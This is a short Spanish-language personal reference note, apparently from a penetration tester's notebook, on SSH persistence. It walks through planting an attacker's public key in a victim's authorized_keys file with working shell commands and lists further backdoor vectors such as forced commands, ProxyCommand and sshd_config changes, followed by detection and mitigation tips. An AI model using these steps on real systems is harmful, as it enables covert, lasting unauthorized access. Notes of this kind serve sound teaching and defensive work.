#reference #Ciberseguridad

**Persistencia por SSH** = plantar una **clave pública** del atacante en `authorized_keys` de la víctima para reconectar sin contraseña, de forma estable y silenciosa (mejor que una reverse shell). Requiere acceso previo a la cuenta.

# Procedimiento

1. En la máquina víctima — preparar `.ssh`:
```bash
cd /home/user
mkdir -p .ssh
chmod 700 .ssh
```

2. En la máquina atacante — generar par de claves:
```bash
ssh-keygen -t ed25519 -f user_key      # (o -t rsa)
cat user_key.pub                       # copiar el contenido
```

3. De nuevo en la víctima — autorizar la clave:
```bash
echo "CONTENIDO DE user_key.pub" >> /home/user/.ssh/authorized_keys
chmod 600 /home/user/.ssh/authorized_keys
```

4. Conectar desde el atacante:
```bash
ssh -i user_key user@<IP>
```

> Usar `>>` (append) para no borrar claves legítimas existentes. Permisos correctos (`700` dir, `600` fichero) o SSH rechaza la clave.

# Otras vías de persistencia SSH

| Vector | Idea |
|--------|------|
| `authorized_keys` con `command=` | Forzar ejecución de un comando al conectar. |
| Backdoor en `~/.ssh/config` / `ProxyCommand` | Ejecutar al usar ssh. |
| Claves en root | Persistencia privilegiada (si se compromete root). |
| Modificar `sshd_config` | `PermitRootLogin yes`, puertos extra. |

# Detección / mitigación

- Auditar `authorized_keys` de todas las cuentas (claves desconocidas).
- Monitorizar cambios en `~/.ssh/` y `sshd_config`.
- Restringir `AuthorizedKeysFile`, usar `AllowUsers`, MFA.

> Uso solo en engagements autorizados.

# Recursos
### [[LinPE_cheatsheet]] · [[C2 backdoor]]
### [HackTricks — Linux persistence](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ssh)
